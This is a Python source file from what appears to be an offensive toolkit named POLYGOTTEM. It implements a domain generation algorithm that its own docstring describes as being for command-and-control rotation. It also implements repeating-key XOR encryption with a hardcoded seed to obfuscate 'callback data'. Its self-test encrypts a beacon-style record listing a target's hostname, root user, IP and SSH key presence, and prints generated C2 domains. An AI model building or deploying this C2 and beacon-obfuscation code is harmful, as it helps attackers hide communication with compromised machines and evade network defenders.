#!/usr/bin/env python3
"""
POLYGOTTEM SECURE - Cryptographic Utilities
XOR encryption with DGA-derived keys for callback data obfuscation

Features:
- Domain Generation Algorithm (DGA) for dynamic key derivation
- XOR cipher with derived keys (simple but effective)
- Time-based key rotation support
- Multiple DGA algorithms for variety
- No hardcoded keys required

Compatible with resource-constrained environments (no heavy crypto libs needed)
"""

import hashlib
import base64
from datetime import datetime, timedelta
from typing import Tuple, Optional


class DGAKeyDerivation:
    """
    Domain Generation Algorithm-based key derivation
    Generates encryption keys based on date, seed, and algorithm choice
    """

    def __init__(self, seed: str = "insovietrussiawehackyou"):
        """
        Initialize DGA key derivation

        Args:
            seed: Master seed for key generation (should be synchronized between client/server)
        """
        self.seed = seed

    def generate_key_for_date(
        self,
        date: Optional[datetime] = None,
        algorithm: str = "sha256",
        key_length: int = 32
    ) -> bytes:
        """
        Generate encryption key for a specific date using DGA

        Args:
            date: Date to generate key for (default: today)
            algorithm: Hash algorithm to use (sha256, sha512, md5)
            key_length: Length of derived key in bytes

        Returns:
            Derived encryption key
        """
        if date is None:
            date = datetime.utcnow()

        # Create date-based domain string
        date_str = date.strftime("%Y-%m-%d")

        # Generate domain using DGA (simple algorithm)
        domain_parts = []

        # Algorithm 1: Hash-based character generation
        hash_input = f"{self.seed}:{date_str}".encode('utf-8')

        if algorithm == "sha256":
            hash_obj = hashlib.sha256(hash_input)
        elif algorithm == "sha512":
            hash_obj = hashlib.sha512(hash_input)
        elif algorithm == "md5":
            hash_obj = hashlib.md5(hash_input)
        else:
            hash_obj = hashlib.sha256(hash_input)

        # Derive key from hash
        key_material = hash_obj.digest()

        # Extend key if needed
        while len(key_material) < key_length:
            hash_obj = hashlib.sha256(key_material + hash_input)
            key_material += hash_obj.digest()

        return key_material[:key_length]

    def generate_rotating_key(
        self,
        rotation_hours: int = 24,
        algorithm: str = "sha256",
        key_length: int = 32
    ) -> bytes:
        """
        Generate key that rotates every N hours

        Args:
            rotation_hours: Hours between key rotation (default: 24 for daily)
            algorithm: Hash algorithm to use
            key_length: Length of derived key

        Returns:
            Current rotation period's key
        """
        now = datetime.utcnow()

        # Calculate rotation period start
        hours_since_epoch = int(now.timestamp() / 3600)
        period_start_hours = (hours_since_epoch // rotation_hours) * rotation_hours
        period_start = datetime.utcfromtimestamp(period_start_hours * 3600)

        return self.generate_key_for_date(period_start, algorithm, key_length)

    def generate_domain_list(
        self,
        date: Optional[datetime] = None,
        count: int = 10
    ) -> list:
        """
        Generate list of DGA domains for a given date (for C2 rotation)

        Args:
            date: Date to generate domains for
            count: Number of domains to generate

        Returns:
            List of generated domains
        """
        if date is None:
            date = datetime.utcnow()

        domains = []
        date_str = date.strftime("%Y%m%d")

        for i in range(count):
            # Generate domain using seed + date + index
            hash_input = f"{self.seed}:{date_str}:{i}".encode('utf-8')
            hash_hex = hashlib.sha256(hash_input).hexdigest()

            # Create pronounceable-ish domain
            domain_length = 12 + (int(hash_hex[0], 16) % 8)  # 12-19 chars
            domain_name = ""

            for j in range(0, domain_length * 2, 2):
                char_value = int(hash_hex[j:j+2], 16)
                # Map to lowercase letters
                domain_name += chr(97 + (char_value % 26))

            # Add TLD
            tlds = ['.com', '.net', '.org', '.info', '.biz']
            tld = tlds[int(hash_hex[-1], 16) % len(tlds)]

            domains.append(domain_name[:domain_length] + tld)

        return domains


class XORCipher:
    """
    XOR cipher with key scheduling for callback data encryption
    Simple, fast, and effective for obfuscation
    """

    def __init__(self, key: bytes):
        """
        Initialize XOR cipher with key

        Args:
            key: Encryption key (any length)
        """
        if not key:
            raise ValueError("Encryption key cannot be empty")
        self.key = key

    def encrypt(self, plaintext: str) -> str:
        """
        Encrypt plaintext using XOR cipher

        Args:
            plaintext: String to encrypt

        Returns:
            Base64-encoded ciphertext
        """
        plaintext_bytes = plaintext.encode('utf-8')
        ciphertext_bytes = self._xor_bytes(plaintext_bytes)

        # Encode as base64 for safe transmission
        return base64.b64encode(ciphertext_bytes).decode('ascii')

    def decrypt(self, ciphertext: str) -> str:
        """
        Decrypt ciphertext using XOR cipher

        Args:
            ciphertext: Base64-encoded ciphertext

        Returns:
            Decrypted plaintext
        """
        try:
            ciphertext_bytes = base64.b64decode(ciphertext)
            plaintext_bytes = self._xor_bytes(ciphertext_bytes)
            return plaintext_bytes.decode('utf-8')
        except Exception as e:
            raise ValueError(f"Decryption failed: {e}")

    def _xor_bytes(self, data: bytes) -> bytes:
        """
        XOR data with key (repeating key as needed)

        Args:
            data: Bytes to XOR

        Returns:
            XORed bytes
        """
        key_length = len(self.key)
        return bytes([data[i] ^ self.key[i % key_length] for i in range(len(data))])


class CallbackCrypto:
    """
    High-level encryption system for callback data
    Combines DGA key derivation with XOR encryption
    """

    def __init__(
        self,
        seed: str = "insovietrussiawehackyou",
        rotation_hours: int = 24,
        algorithm: str = "sha256"
    ):
        """
        Initialize callback encryption system

        Args:
            seed: Master seed for DGA (must match between client/server)
            rotation_hours: Hours between key rotation
            algorithm: Hash algorithm for key derivation
        """
        self.dga = DGAKeyDerivation(seed)
        self.rotation_hours = rotation_hours
        self.algorithm = algorithm

    def encrypt_callback(self, data: str) -> str:
        """
        Encrypt callback data with current DGA-derived key

        Args:
            data: Callback data to encrypt (JSON string)

        Returns:
            Encrypted data (base64)
        """
        # Get current key
        key = self.dga.generate_rotating_key(
            self.rotation_hours,
            self.algorithm
        )

        # Encrypt with XOR
        cipher = XORCipher(key)
        return cipher.encrypt(data)

    def decrypt_callback(
        self,
        encrypted_data: str,
        try_previous: bool = True
    ) -> Optional[str]:
        """
        Decrypt callback data with DGA-derived key
        Tries current and optionally previous rotation period

        Args:
            encrypted_data: Base64-encoded encrypted data
            try_previous: Try previous rotation period if current fails

        Returns:
            Decrypted data or None if decryption failed
        """
        # Try current key
        current_key = self.dga.generate_rotating_key(
            self.rotation_hours,
            self.algorithm
        )

        cipher = XORCipher(current_key)
        try:
            return cipher.decrypt(encrypted_data)
        except Exception:
            pass

        # Try previous rotation period (for clock skew tolerance)
        if try_previous:
            previous_date = datetime.utcnow() - timedelta(hours=self.rotation_hours)
            period_start_hours = int(previous_date.timestamp() / 3600)
            period_start_hours = (period_start_hours // self.rotation_hours) * self.rotation_hours
            previous_period = datetime.utcfromtimestamp(period_start_hours * 3600)

            previous_key = self.dga.generate_key_for_date(
                previous_period,
                self.algorithm
            )

            cipher = XORCipher(previous_key)
            try:
                return cipher.decrypt(encrypted_data)
            except Exception:
                pass

        return None

    def get_current_key_info(self) -> dict:
        """
        Get information about current encryption key (for debugging)

        Returns:
            Dictionary with key metadata
        """
        key = self.dga.generate_rotating_key(self.rotation_hours, self.algorithm)

        return {
            "algorithm": self.algorithm,
            "rotation_hours": self.rotation_hours,
            "key_length": len(key),
            "key_hash": hashlib.sha256(key).hexdigest()[:16],  # First 16 chars
            "current_time": datetime.utcnow().isoformat()
        }


# Convenience functions for quick usage

def encrypt_callback_data(
    data: str,
    seed: str = "insovietrussiawehackyou"
) -> str:
    """
    Quick function to encrypt callback data

    Args:
        data: Data to encrypt
        seed: DGA seed

    Returns:
        Encrypted data (base64)
    """
    crypto = CallbackCrypto(seed=seed)
    return crypto.encrypt_callback(data)


def decrypt_callback_data(
    encrypted_data: str,
    seed: str = "insovietrussiawehackyou"
) -> Optional[str]:
    """
    Quick function to decrypt callback data

    Args:
        encrypted_data: Encrypted data (base64)
        seed: DGA seed

    Returns:
        Decrypted data or None
    """
    crypto = CallbackCrypto(seed=seed)
    return crypto.decrypt_callback(encrypted_data)


if __name__ == "__main__":
    # Test encryption system
    print("=== POLYGOTTEM Callback Encryption Test ===\n")

    # Initialize crypto system
    crypto = CallbackCrypto(
        seed="insovietrussiawehackyou",
        rotation_hours=24,
        algorithm="sha256"
    )

    # Display key info
    key_info = crypto.get_current_key_info()
    print(f"Algorithm: {key_info['algorithm']}")
    print(f"Key Length: {key_info['key_length']} bytes")
    print(f"Key Hash: {key_info['key_hash']}...")
    print(f"Rotation: Every {key_info['rotation_hours']} hours")
    print(f"Current Time: {key_info['current_time']}\n")

    # Test encryption
    test_data = '{"hostname": "target01", "username": "root", "ip": "192.168.1.100", "ssh_key": "present"}'
    print(f"Original: {test_data}")

    encrypted = crypto.encrypt_callback(test_data)
    print(f"\nEncrypted: {encrypted}")

    decrypted = crypto.decrypt_callback(encrypted)
    print(f"\nDecrypted: {decrypted}")

    print(f"\nMatch: {test_data == decrypted}")

    # Test DGA domains
    print("\n=== DGA Domain Generation ===")
    dga = DGAKeyDerivation("insovietrussiawehackyou")
    domains = dga.generate_domain_list(count=5)
    print(f"Generated domains for today:")
    for i, domain in enumerate(domains, 1):
        print(f"  {i}. {domain}")
